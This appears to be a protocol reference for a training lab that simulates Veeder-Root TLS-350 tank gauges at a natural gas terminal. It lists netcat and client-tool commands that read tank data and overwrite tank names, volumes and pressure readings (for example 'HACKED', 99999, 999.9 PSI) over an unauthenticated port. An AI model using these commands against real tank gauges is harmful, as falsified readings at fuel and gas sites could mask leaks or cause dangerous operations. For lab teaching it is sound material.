# TLS-350 ATG Protocol Reference

This document provides reference information for the TLS-350 protocol used by Veeder-Root Automatic Tank Gauges (ATGs) and the ATG client tool included with this lab.

---

## Table of Contents

1. [Protocol Overview](#protocol-overview)
2. [Command Format](#command-format)
3. [Read Commands](#read-commands)
4. [Write Commands](#write-commands)
5. [Response Format](#response-format)
6. [Error Responses](#error-responses)
7. [ATG Client Tool](#atg-client-tool)
8. [Manual Testing with Netcat](#manual-testing-with-netcat)

---

## Protocol Overview

The TLS-350 protocol is used by Veeder-Root Guardian AST (Automatic Storage Tank) systems to monitor fuel storage tanks. These systems are commonly found at gas stations, fuel depots, and industrial facilities.

### Key Characteristics

- **Transport**: TCP
- **Default Port**: 10001
- **Authentication**: None (by design)
- **Encryption**: None
- **Command Style**: Text-based with binary framing

### Security Implications

The TLS-350 protocol has no authentication or encryption. Anyone with network access to the ATG can:
- Read all tank data
- Modify tank names
- Change volume and pressure readings (in this lab)

This is realistic behavior - real ATGs often have the same vulnerabilities.

---

## Command Format

All TLS-350 commands follow this structure:

```
[SOH] + [COMMAND] + [NEWLINE]
  ^        ^           ^
  |        |           +-- 0x0A (Line Feed)
  |        +-------------- Command string (e.g., "I20100")
  +----------------------- 0x01 (Start of Header / Ctrl+A)
```

### Sending Commands

**With netcat (hex escape):**
```bash
echo -e '\x01I20100\n' | nc localhost 10001
```

**With telnet (Ctrl+A prefix):**
```
telnet localhost 10001
^AI20100
```
(Press Ctrl+A, then type the command, then press Enter)

**With the ATG client tool:**
```bash
python3 tools/atg_client.py inventory
```

---

## Read Commands

### I20100 - Tank Inventory Report

Returns volume, temperature, and other metrics for all tanks.

**Command:** `I20100`

**Example:**
```bash
echo -e '\x01I20100\n' | nc localhost 10001
```

**Response:**
```
JAN 08, 2026  2:34 PM

     RIVERSIDE NATURAL GAS TERMINAL


IN-TANK INVENTORY

TANK PRODUCT             VOLUME TC VOLUME   ULLAGE   HEIGHT    WATER     TEMP
  1  NG-MAIN              38420    38105    11580    72.45     12.5    58.20
  2  NG-RESERVE           44850    44520     5150    84.30      8.2    56.80
  3  NG-FEED               8240     8180     1760    62.10      4.1    59.40
  4  DIESEL-PRI            6842     6790     3158    65.50      0.40   68.50
  5  DIESEL-RES            9850     9780      150    94.20      0.10   65.20
  6  WATER-UTIL           18500    18500     6500    88.80      0.00   52.40
```

**Fields:**
| Field | Description | Units |
|-------|-------------|-------|
| TANK | Tank number | 1-6 |
| PRODUCT | Product name | Text |
| VOLUME | Current volume | MCF or GAL |
| TC VOLUME | Temperature-compensated volume | MCF or GAL |
| ULLAGE | Empty space (capacity - volume) | MCF or GAL |
| HEIGHT | Product height | Inches |
| WATER | Water content | GAL or Inches |
| TEMP | Temperature | Fahrenheit |

---

### I20200 - Tank Delivery Report

Returns recent delivery information for all tanks.

**Command:** `I20200`

**Example:**
```bash
echo -e '\x01I20200\n' | nc localhost 10001
```

---

### I20300 - Tank Leak Test Results

Returns leak detection status for all tanks.

**Command:** `I20300`

**Example:**
```bash
echo -e '\x01I20300\n' | nc localhost 10001
```

---

### I20400 - Tank Shift Report

Returns shift-based inventory tracking data.

**Command:** `I20400`

**Example:**
```bash
echo -e '\x01I20400\n' | nc localhost 10001
```

---

### I20500 - Tank Status Report

Returns current operational status of all tanks.

**Command:** `I20500`

**Example:**
```bash
echo -e '\x01I20500\n' | nc localhost 10001
```

---

### I20600 - Pressure Sensor Report

Returns pressure readings for tanks with pressure sensors (natural gas tanks).

**Command:** `I20600`

**Example:**
```bash
echo -e '\x01I20600\n' | nc localhost 10001
```

**Response:**
```
JAN 08, 2026  2:34 PM

     RIVERSIDE NATURAL GAS TERMINAL


PRESSURE SENSOR REPORT

TANK PRODUCT             PRESSURE    STATUS
  1  NG-MAIN              485.2 PSI  NORMAL
  2  NG-RESERVE           520.8 PSI  NORMAL
  3  NG-FEED              445.0 PSI  NORMAL
  4  DIESEL-PRI             N/A      ATMOSPHERIC
  5  DIESEL-RES             N/A      ATMOSPHERIC
  6  WATER-UTIL             N/A      ATMOSPHERIC
```

**Notes:**
- Only tanks 1-3 (Natural Gas) have pressure sensors
- Tanks 4-6 show "N/A" and "ATMOSPHERIC"

---

## Write Commands

### S602xx - Set Tank Product Name

Changes the product name for a specific tank.

**Format:** `S602[TANK_ID][NEW_NAME]`

| Tank | Command |
|------|---------|
| 1 | S60201 |
| 2 | S60202 |
| 3 | S60203 |
| 4 | S60204 |
| 5 | S60205 |
| 6 | S60206 |

**Example - Change Tank 1 name to "HACKED":**
```bash
echo -e '\x01S60201HACKED\n' | nc localhost 10001
```

**Verify:**
```bash
echo -e '\x01I20100\n' | nc localhost 10001
```

**Notes:**
- Names are truncated/padded to fit the display width
- No confirmation response is returned
- Change takes effect immediately

---

### S60210 - Set Tank Volume

Changes the volume reading for a specific tank.

**Format:** `S60210:[TANK_ID]:[VALUE]`

**Example - Set Tank 1 volume to 99999:**
```bash
echo -e '\x01S60210:1:99999\n' | nc localhost 10001
```

**Example - Set Tank 3 volume to 0:**
```bash
echo -e '\x01S60210:3:0\n' | nc localhost 10001
```

**Notes:**
- Value should be numeric
- No validation against tank capacity
- Change takes effect immediately

---

### S60220 - Set Tank Pressure

Changes the pressure reading for tanks with pressure sensors.

**Format:** `S60220:[TANK_ID]:[VALUE]`

**Example - Set Tank 1 pressure to 999.9 PSI:**
```bash
echo -e '\x01S60220:1:999.9\n' | nc localhost 10001
```

**Notes:**
- Only works on tanks 1-3 (Natural Gas)
- Value should be numeric (PSI)
- No validation against safe limits

---

## Response Format

### Standard Response Header

All read commands return responses with this header format:

```
[DATE/TIME]

     [STATION NAME]


[REPORT TITLE]

[DATA]
```

### Response Termination

Responses are terminated with ETX (0x03) character.

---

## Error Responses

### Invalid Command

When a command is not recognized or malformed:

```
9999FF1B
```

This is the standard TLS-350 error response format:
- `9999` - Error code (unknown command)
- `FF1B` - Checksum

### Common Causes

- Missing SOH (0x01) prefix
- Typo in command code
- Invalid command format

---

## ATG Client Tool

The lab includes a Python CLI tool for interacting with the ATG.

**Location:** `tools/atg_client.py`

### Basic Usage

```bash
# Show help
python3 tools/atg_client.py --help

# Show command help
python3 tools/atg_client.py inventory --help
```

### Read Commands

```bash
# Tank inventory
python3 tools/atg_client.py inventory

# Pressure readings
python3 tools/atg_client.py pressure

# Tank status
python3 tools/atg_client.py status

# Delivery report
python3 tools/atg_client.py delivery

# Leak test results
python3 tools/atg_client.py leak

# Shift report
python3 tools/atg_client.py shift
```

### Write Commands

```bash
# Change tank name
python3 tools/atg_client.py set-name 1 "NEW-NAME"

# Change tank volume
python3 tools/atg_client.py set-volume 1 99999
```

### Raw Commands

```bash
# Send any TLS-350 command
python3 tools/atg_client.py raw I20100
python3 tools/atg_client.py raw S60201MODIFIED
```

### Connection Options

```bash
# Connect to different host
python3 tools/atg_client.py -H 192.168.1.100 inventory

# Connect to different port
python3 tools/atg_client.py -p 10002 inventory

# Set timeout
python3 tools/atg_client.py -t 10 inventory

# Verbose output (show raw communication)
python3 tools/atg_client.py -v inventory
```

---

## Manual Testing with Netcat

### Basic Commands

```bash
# Get inventory
echo -e '\x01I20100\n' | nc localhost 10001

# Get pressure
echo -e '\x01I20600\n' | nc localhost 10001

# Get status
echo -e '\x01I20500\n' | nc localhost 10001
```

### Write Commands

```bash
# Change tank 1 name
echo -e '\x01S60201COMPROMISED\n' | nc localhost 10001

# Change tank 1 volume
echo -e '\x01S60210:1:99999\n' | nc localhost 10001

# Change tank 2 pressure
echo -e '\x01S60220:2:999.9\n' | nc localhost 10001
```

### Interactive Session

```bash
# Start interactive session
nc localhost 10001

# Then type commands with Ctrl+A prefix:
# Press Ctrl+A, type I20100, press Enter
```

### Using Telnet

```bash
telnet localhost 10001

# Type: Ctrl+A then I20100 then Enter
```

---

## Quick Reference Card

### Read Commands

| Command | Description | ATG Client |
|---------|-------------|------------|
| I20100 | Tank Inventory | `inventory` |
| I20200 | Delivery Report | `delivery` |
| I20300 | Leak Test | `leak` |
| I20400 | Shift Report | `shift` |
| I20500 | Status Report | `status` |
| I20600 | Pressure Report | `pressure` |

### Write Commands

| Command | Format | ATG Client |
|---------|--------|------------|
| S602xx | S60201NAME | `set-name 1 "NAME"` |
| S60210 | S60210:TANK:VALUE | `set-volume 1 99999` |
| S60220 | S60220:TANK:VALUE | N/A |

### Netcat Examples

```bash
# Enumerate
echo -e '\x01I20100\n' | nc localhost 10001
echo -e '\x01I20600\n' | nc localhost 10001

# Manipulate
echo -e '\x01S60201HACKED\n' | nc localhost 10001
echo -e '\x01S60210:1:0\n' | nc localhost 10001
```
